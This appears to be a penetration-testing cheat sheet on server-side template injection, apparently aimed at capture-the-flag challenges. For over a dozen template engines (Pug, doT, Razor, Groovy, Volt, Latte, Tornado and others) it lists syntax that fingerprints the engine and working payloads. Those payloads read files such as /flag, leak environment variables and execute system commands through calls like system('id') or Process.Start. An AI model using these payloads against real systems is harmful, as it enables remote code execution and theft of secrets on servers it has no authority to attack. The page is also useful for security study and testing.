# Extended engines — the long tail

The engines you'll hit once a year — the signatures so you don't
mistake them for something else.

---

## Pug (Jade) — Node

```pug
p= 7*7              → <p>49</p> — indented-tag syntax
= 7*7               → bare-eval line
#{7*7}              → interpolation → 49
- var x = 7*7       → unbuffered JS
p #{process.env.FLAG} — env-leak
p= global.process.mainModule.require('fs').readFileSync('/flag','utf8')
```

Pug is indentation-syntax — `p= expr` evaluates JS — full node
reach, same as EJS. Detection: `#{7*7}` → 49, `p= 7*7` renders
`<p>49</p>`.

## Dust.js — LinkedIn's engine

```dust
{x}                  — the var — NOT {{x}}
{?x}...{/x}          — conditional-exists
{#x}...{/x}          — section/loop
{@if cond="..."}     — logic helper
{>partial/}          — include
```

Dust is logic-limited — escape-surface via context-objects +
custom helpers. `{x.constructor.name}` style paths — limited.

## doT — the fastest js engine

```dot
{{= 7*7}}            → 49 — the =interpolation
{{? if }} {{?? elif }} {{?}} — conditionals
{{~it}}              — iteration
{{ var x=7*7; }}     — code-block
{{= process.env.FLAG}}
{{= global.process.mainModule.require('fs')...}}
```

`{{=}}` — equals-sign interpolation — distinguishes from jinja.
Full JS in `{{ }}` code-blocks — it's compiled to a function.

## Marko — eBay's engine

```marko
${7*7}               → 49? — ${} interpolation
${process.env.FLAG}
if(x) — tag-logic
```

`${}` — same as FreeMarker/Velocity surface — JS behind it.

## Beetl — Java (Chinese engine)

```java
${7*7}               → 49
<% code %>           — alternate statement-syntax
${x.getClass()}
${@java.lang.Runtime@getRuntime()}   — @static — OGNL-like
```

Beetl looks like Velocity but its function/registry model —
`@` static-reach similar to OGNL.

## HTTL — Java

```java
${7*7}
${x.getClass().forName('java.lang.Runtime')}
```

Similar ${}-surface to Velocity — the .class chain applies.

## RythmEngine — Java

```java
@7*7                  → the @ prefix — AT-sign exprs
@System.getenv()
@x.getClass()
@.flag                — context attr
@args.x               — arg-bind
```

`@` — the Razor-ish sigil but Java — RythmEngine uses it.

## Razor (.NET) — cshtml

```razor
@x                              — expression
@(x)                            — parenthesized
@{ var y = x; }                 — code block
@System.Diagnostics.Process.Start("cmd")
@System.IO.File.ReadAllText("/flag")
@System.Environment.GetEnvironmentVariable("FLAG")
@(new System.IO.StreamReader("/flag").ReadToEnd())
```

Full C# — `@` is code — no sandbox — `.cshtml` views on .NET.

## Groovy MarkupTemplateEngine — Java

```groovy
${7*7}                    → 49 in GString-interp
${'id'.execute()}
${new File('/flag').text}
yield 'text'              — yield-directive
p('text')                  — tag-fn
```

Groovy DSL — `${}` in strings + method-calls — full groovy.

## Play Framework templates — Java/Scala

```scala
@(x)                       — the @-form
@{7*7}                     — expression-block
@x.getClass()
@import java.lang.Runtime
```

Scala templates — `@` prefix — Java-interop — `.getClass()` reach.

## Volt — Phalcon PHP

```volt
{{7*7}}              → 49 — jinja-syntax php
{{'a'~'b'}}           → 'ab'
{{file_get_contents('/flag')}}
{{system('id')}}
{{this.getDi()}}        — DI-container reach
```

Volt compiles to PHP — jinja-surface — php-functions callable.

## Latte — Nette PHP

```php
{=7*7}               → 49 — =expr
{=system('id')}
{=file_get_contents('/flag')}
{$x}                  — var
{x|modifier}
{include 'file'}
```

`{=expr}` — equals-expression — php reachable.

## Plates — PHP

```php
<?=$this->e($x)?>              — escape-fn
<?=$this->fetch('/flag')?>      — fetch = include-adjacent
```

PHP-native — `<?php?>` raw in templates — it's PHP anyway.

## Tornado templates — Python

```python
{{7*7}}               → 49 — jinja-like surface
{% autoescape %}
{% import os %}
{% module Expression(x) %}
{{os.popen('id').read()}}     — if os in namespace
```

`{% import %}` — tornado-specific — module-import in template —
full python.

## Ractive.js / AngularJS-template / Vue-template (client)

```text
{{x}} client-side — NOT SSTI — client-side template-injection —
   different bug-class — XSS-adjacent — {{constructor.constructor}}
   — the CSTI chain — covered in web-xss references
```

Client-side template-injection (CSTI) — same syntax-shape —
context is the BROWSER not the server — XSS-class not SSTI —
the `{{7*7}}`→49 tells you a template-evaluates; `{{'x'.constructor}}`
tells you it's JS-land; the browser-vs-server check: does it eval
in YOUR browser or the SERVER response — view-source decides.

## Twig — the `.twig` extension hint

```text
files ending .twig / render() calls → Twig
templates/*.twig in source → Twig
{{ path('route') }} → Symfony-Twig — the path() fn
```

## The unknown-engine fallbacks

```text
1. read the file-extension in source-dir: .jinja2 .twig .vm .ftl
   .thymeleaf .html .ejs .pug .hbs .liquid .volt .latte .cshtml
2. read package.json/Gemfile/requirements.txt/pom.xml —
   the dep names the engine
3. grep the source for render-string calls — the class names it
4. force-error → stack-trace → class-name in the trace
5. polyglot → whichever segment fires → the family
```
